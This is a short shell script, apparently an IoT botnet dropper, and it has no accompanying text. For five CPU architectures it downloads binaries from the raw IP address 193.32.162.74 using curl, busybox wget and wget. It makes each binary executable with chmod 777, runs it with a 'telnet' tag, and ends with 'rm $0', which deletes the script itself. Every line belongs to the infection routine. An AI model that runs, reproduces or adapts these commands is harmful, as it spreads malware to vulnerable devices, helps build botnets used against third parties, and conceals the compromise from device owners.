curl http://193.32.162.74/bins/arm; chmod 777 arm; ./arm telnet.arm
curl http://193.32.162.74/bins/arm5; chmod 777 arm5; ./arm5 telnet.arm5
curl http://193.32.162.74/bins/arm7; chmod 777 arm7; ./arm7 telnet.arm7
curl http://193.32.162.74/bins/mipsel; chmod 777 mipsel; ./mipsel telnet.mipsel
curl http://193.32.162.74/bins/mips; chmod 777 mips; ./mips telnet.mips

busybox wget http://193.32.162.74/bins/arm; chmod 777 arm; ./arm telnet.arm
busybox wget http://193.32.162.74/bins/arm5; chmod 777 arm5; ./arm5 telnet.arm5
busybox wget http://193.32.162.74/bins/arm7; chmod 777 arm7; ./arm7 telnet.arm7
busybox wget http://193.32.162.74/bins/mipsel; chmod 777 mipsel; ./mipsel telnet.mipsel
busybox wget http://193.32.162.74/bins/mips; chmod 777 mips; ./mips telnet.mips

wget http://193.32.162.74/bins/arm; chmod 777 arm; ./arm telnet.arm
wget http://193.32.162.74/bins/arm5; chmod 777 arm5; ./arm5 telnet.arm5
wget http://193.32.162.74/bins/arm7; chmod 777 arm7; ./arm7 telnet.arm7
wget http://193.32.162.74/bins/mipsel; chmod 777 mipsel; ./mipsel telnet.mipsel
wget http://193.32.162.74/bins/mips; chmod 777 mips; ./mips telnet.mips

rm $0   